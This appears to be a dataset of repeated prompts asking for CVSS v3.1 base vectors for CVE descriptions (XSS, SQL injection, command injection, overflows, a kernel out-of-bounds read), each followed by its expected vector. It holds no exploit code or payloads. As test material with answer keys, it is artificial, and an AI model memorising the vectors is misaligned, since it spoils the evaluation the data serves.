Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The PDF Flipbook, 3D Flipbook – DearFlip plugin for WordPress is vulnerable to Stored Cross-Site Scripting via outline settings in all versions up to, and including, 2.2.26 due to insufficient input sanitization and output escaping on user supplied data. This makes it possible for authenticated attackers with contributor-level and above permissions to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: An agent link vulnerability in the Trend Micro Apex One security agent could allow a local attacker to escalate privileges on affected installations.  Please note: an attacker must first obtain the ability to execute low-privileged code on the target system in order to exploit this vulnerability. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: in OpenHarmony v3.2.2 and prior versions allow a local attacker cause multimedia audio crash through modify a released pointer. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in ClickToTweet.Com Click To Tweet allows Stored XSS.This issue affects Click To Tweet: from n/a through 2.0.14. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: MRCMS 3.0 contains an Arbitrary File Read vulnerability in /admin/file/edit.do as the incoming path parameter is not filtered. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: This vulnerability exist in Skyworth Router CM5100, version 4.1.1.24, due to insufficient validation of user supplied input for the Network Name (SSID) parameter at its web interface.  A remote attacker could exploit this vulnerability by supplying specially crafted input to the parameter at the web interface of the vulnerable targeted system.  Successful exploitation of this vulnerability could allow the attacker to perform stored XSS attacks on the targeted system. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Code-projects Simple School Managment System 1.0 allows Authentication Bypass via the username and password parameters at School/index.php. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: SQL injection vulnerability in EmpireCMS v7.5, allows remote attackers to execute arbitrary code and obtain sensitive information via the DoExecSql function. 	CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: File Upload vulnerability index.php in Pichome v.1.1.01 allows a remote attacker to execute arbitrary code via crafted POST request. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: In the Linux kernel, the following vulnerability has been resolved:  net/sched: sch_frag: fix stack OOB read while fragmenting IPv4 packets  when 'act_mirred' tries to fragment IPv4 packets that had been previously re-assembled using 'act_ct', splats like the following can be observed on kernels built with KASAN:   BUG: KASAN: stack-out-of-bounds in ip_do_fragment+0x1b03/0x1f60  Read of size 1 at addr ffff888147009574 by task ping/947   CPU: 0 PID: 947 Comm: ping Not tainted 5.12.0-rc6+ #418  Hardware name: Red Hat KVM, BIOS 1.11.1-4.module+el8.1.0+4066+0f1aadab 04/01/2014  Call Trace:   <IRQ>   dump_stack+0x92/0xc1   print_address_description.constprop.7+0x1a/0x150   kasan_report.cold.13+0x7f/0x111   ip_do_fragment+0x1b03/0x1f60   sch_fragment+0x4bf/0xe40   tcf_mirred_act+0xc3d/0x11a0 [act_mirred]   tcf_action_exec+0x104/0x3e0   fl_classify+0x49a/0x5e0 [cls_flower]   tcf_classify_ingress+0x18a/0x820   __netif_receive_skb_core+0xae7/0x3340   __netif_receive_skb_one_core+0xb6/0x1b0   process_backlog+0x1ef/0x6c0   __napi_poll+0xaa/0x500   net_rx_action+0x702/0xac0   __do_softirq+0x1e4/0x97f   do_softirq+0x71/0x90   </IRQ>   __local_bh_enable_ip+0xdb/0xf0   ip_finish_output2+0x760/0x2120   ip_do_fragment+0x15a5/0x1f60   __ip_finish_output+0x4c2/0xea0   ip_output+0x1ca/0x4d0   ip_send_skb+0x37/0xa0   raw_sendmsg+0x1c4b/0x2d00   sock_sendmsg+0xdb/0x110   __sys_sendto+0x1d7/0x2b0   __x64_sys_sendto+0xdd/0x1b0   do_syscall_64+0x33/0x40   entry_SYSCALL_64_after_hwframe+0x44/0xae  RIP: 0033:0x7f82e13853eb  Code: 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 44 00 00 f3 0f 1e fa 48 8d 05 75 42 2c 00 41 89 ca 8b 00 85 c0 75 14 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 75 c3 0f 1f 40 00 41 57 4d 89 c7 41 56 41 89  RSP: 002b:00007ffe01fad888 EFLAGS: 00000246 ORIG_RAX: 000000000000002c  RAX: ffffffffffffffda RBX: 00005571aac13700 RCX: 00007f82e13853eb  RDX: 0000000000002330 RSI: 00005571aac13700 RDI: 0000000000000003  RBP: 0000000000002330 R08: 00005571aac10500 R09: 0000000000000010  R10: 0000000000000000 R11: 0000000000000246 R12: 00007ffe01faefb0  R13: 00007ffe01fad890 R14: 00007ffe01fad980 R15: 00005571aac0f0a0   The buggy address belongs to the page:  page:000000001dff2e03 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x147009  flags: 0x17ffffc0001000(reserved)  raw: 0017ffffc0001000 ffffea00051c0248 ffffea00051c0248 0000000000000000  raw: 0000000000000000 0000000000000000 00000001ffffffff 0000000000000000  page dumped because: kasan: bad access detected   Memory state around the buggy address:   ffff888147009400: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ffff888147009480: f1 f1 f1 f1 04 f2 f2 f2 f2 f2 f2 f2 00 00 00 00  >ffff888147009500: 00 00 00 00 00 00 00 00 00 00 f2 f2 f2 f2 f2 f2                                                               ^   ffff888147009580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ffff888147009600: 00 00 00 00 00 00 00 00 00 00 00 00 00 f2 f2 f2  for IPv4 packets, sch_fragment() uses a temporary struct dst_entry. Then, in the following call graph:    ip_do_fragment()     ip_skb_dst_mtu()       ip_dst_mtu_maybe_forward()         ip_mtu_locked()  the pointer to struct dst_entry is used as pointer to struct rtable: this turns the access to struct members like rt_mtu_locked into an OOB read in the stack. Fix this changing the temporary variable used for IPv4 packets in sch_fragment(), similarly to what is done for IPv6 few lines below. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The Voting Record WordPress plugin through 2.0 is missing sanitisation as well as escaping, which could allow any authenticated users, such as subscriber to perform Stored XSS attacks 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Leanote version 2.7.0 allows obtaining arbitrary local files. This is possible  because the application is vulnerable to LFR. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A Race Condition discovered in geofence.cpp and mission_feasibility_checker.cpp in PX4 Autopilot 1.14 and earlier allows attackers to send drones on unintended missions. 	CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:L
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Buffer over-read vulnerability in Contiki-NG tinyDTLS through master branch 53a0d97 allows attackers obtain sensitive information via crafted input to dtls_ccm_decrypt_message(). 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Authenticated user can execute arbitrary commands in the context of the root user by providing payload in the "destination" field of the network test tools. This is similar to the vulnerability CVE-2021-28151 mitigated on the user interface level by blacklisting characters with JavaScript, however, it can still be exploited by sending POST requests directly. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The Seed Social WordPress plugin before 2.0.4 does not sanitise and escape some of its settings, which could allow high privilege users such as admin to perform Stored Cross-Site Scripting attacks even when the unfiltered_html capability is disallowed (for example in multisite setup). 	CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: IBM Security Access Manager Container (IBM Security Verify Access Appliance 10.0.0.0 through 10.0.6.1 and IBM Security Verify Access Docker 10.0.6.1) temporarily stores sensitive information in files that could be accessed by a local user.  IBM X-Force ID:  254653. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability, which was classified as critical, was found in European Chemicals Agency IUCLID 7.10.3 on Windows. Affected is an unknown function of the file iuclid6.exe of the component Desktop Installer. The manipulation leads to incorrect default permissions. The attack needs to be approached locally. VDB-251670 is the identifier assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Cross-Site Request Forgery (CSRF) vulnerability in WP Spell Check.This issue affects WP Spell Check: from n/a through 9.17. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: In da, there is a possible out of bounds write due to a missing bounds check. This could lead to local escalation of privilege with System execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS08477148; Issue ID: ALPS08477148. 	CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: In TVAPI, there is a possible out of bounds write due to a missing bounds check. This could lead to local escalation of privilege with System execution privileges needed. User interaction is not needed for exploitation. Patch ID: DTV03961601; Issue ID: DTV03961601. 	CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability was found in Tenda i6 1.0.0.9(3857) and classified as critical. This issue affects the function formwrlSSIDset of the file /goform/wifiSSIDset of the component httpd. The manipulation of the argument index leads to stack-based buffer overflow. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-252257 was assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Cross Site Request Forgery vulnerability in flusity-CMS v.2.33 allows a remote attacker to execute arbitrary code via the add_customblock.php. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Posts to Page Kerry James allows Stored XSS.This issue affects Kerry James: from n/a through 1.7. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The EventON - WordPress Virtual Event Calendar Plugin plugin for WordPress is vulnerable to Cross-Site Request Forgery in all versions up to, and including, 4.5.4 (Pro) & 2.2.8 (Free). This is due to missing or incorrect nonce validation on the save_virtual_event_settings function. This makes it possible for unauthenticated attackers to modify virtual event settings via a forged request granted they can trick a site administrator into performing an action such as clicking on a link. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The authentication mechanism can be bypassed by overflowing the value of the Cookie "authentication" field, provided there is an active user session. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Chromium Embedded Framework (CEF) is a simple framework for embedding Chromium-based browsers in other applications.`CefVideoConsumerOSR::OnFrameCaptured` does not check `pixel_format` properly, which leads to out-of-bounds read out of the sandbox. This vulnerability was patched in commit 1f55d2e. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability in Delhivery Delhivery Logistics Courier.This issue affects Delhivery Logistics Courier: from n/a through 1.0.107. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The Limit Login Attempts Reloaded plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin's shortcode(s) in all versions up to, and including, 2.25.26 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers with contributor-level and above permissions to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A cross-site scripting (XSS) vulnerability has been reported to affect Photo Station. If exploited, the vulnerability could allow authenticated users to inject malicious code via a network.  We have already fixed the vulnerability in the following version: Photo Station 6.4.2 ( 2023/12/15 ) and later 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability was found in Tenda AC10U 15.03.06.48/15.03.06.49. It has been rated as critical. This issue affects the function formSetSambaConf of the file /goform/setsambacfg. The manipulation of the argument usbName leads to os command injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-257777 was assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability has been identified in Tecnomatix Plant Simulation V2201 (All versions), Tecnomatix Plant Simulation V2302 (All versions < V2302.0007). The affected applications contain a null pointer dereference vulnerability while parsing specially crafted SPP files. An attacker could leverage this vulnerability to crash the application causing denial of service condition. 	CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability has been reported in Cups Easy (Purchase & Inventory), version 1.0, whereby user-controlled inputs are not sufficiently encoded, resulting in a Cross-Site Scripting (XSS) vulnerability via /cupseasylive/currencylist.php, in the description parameter. Exploitation of this vulnerability could allow a remote attacker to send a specially crafted URL to an authenticated user and steal their session cookie credentials. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Tenda AX1803 v1.0.0.1 contains a stack overflow via the iptv.city.vlan parameter in the function setIptvInfo. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
